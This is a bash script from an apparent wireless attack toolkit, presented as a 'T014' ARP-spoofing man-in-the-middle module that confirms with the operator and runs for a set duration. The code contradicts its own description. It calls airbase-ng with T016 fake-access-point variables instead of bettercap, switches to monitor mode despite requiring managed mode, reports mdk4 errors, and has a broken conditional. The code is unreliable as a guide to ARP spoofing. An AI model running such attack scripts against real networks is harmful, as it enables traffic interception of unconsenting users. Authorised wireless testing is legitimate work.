#!/bin/bash
#
# Utility: ARP Spoofing from Wireless Entry Point (T014)
#
# Description:
#   Simulates a malicious wireless client performing an internal man-in-the-middle attack.
#   Uses bettercap to poison the ARP cache of a target client and optionally sniff traffic.
#
# Requirements:
#   - bettercap must be installed and in PATH
#   - Must be run with sudo/root privileges (handled by watt.py)
#   - Interface must be in managed mode and associated with a target AP
#   - Attacker must be on the same subnet as the target (e.g. via DHCP)
#
# Usage:
#   ./run_bettercap_arp.sh
#
# Inputs:
#   - Target IP address (entered interactively)
#   - Duration in seconds (optional, with default from config)
#
# Notes:
#   - Launches bettercap in non-interactive mode using an embedded command string
#   - Cleans up on SIGINT or timeout using EXIT trap
#   - Optionally disconnects from the network after attack ends

# Load helpers
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/config.sh"
source "$SCRIPT_DIR/print.sh"

# Check bettercap
if ! command -v bettercap &> /dev/null; then
    print_fail "bettercap not found. Please install it first."
    exit 0
fi

# Cleanup
cleanup() {
    print_blank
    print_info "Starting cleanup"
    rm -f /tmp/watt_attack_active

    # Check mode
    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$MODE" != "managed" ]]; then
        print_action "Reverting to Managed mode"
        bash "$SCRIPT_DIR/set-mode-managed.sh"
        print_success "Interface set to Managed mode"
    fi

    exit 0   
}

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$T014_TARGET_IP"; then
    print_warn "Required variables not defined in config.sh: INTERFACE or T014_TARGET_IP"
    exit 0
fi

# Display config
echo "Mode         : T014 - ARP Spoofing"
echo "Interface    : $INTERFACE"
echo "Target IP    : $T014_TARGET_IP"
print_blank

# Confirm attack
print_prompt "Proceed with attack? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input duration
while true; do
    print_prompt "Duration (seconds) [default: ${ATTACK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$ATTACK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Launch attack
echo "T014" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Check mode
MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
if [[ "$MODE" != "monitor" ]]; then
    print_action "Enabling Monitor mode"
    bash "$SCRIPT_DIR/set-mode-monitor.sh"
    print_success "Interface set to Monitor mode"
fi

# Run attack
print_blank
print_info "Running T014 - ARP Spoofing attack for $DURATION seconds"
sudo timeout "$DURATION" airbase-ng -e "$T016_PROBE_SSID" -c "$T016_PROBE_CHANNEL" -a "$T016_PROBE_BSSID" "$INTERFACE"

EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0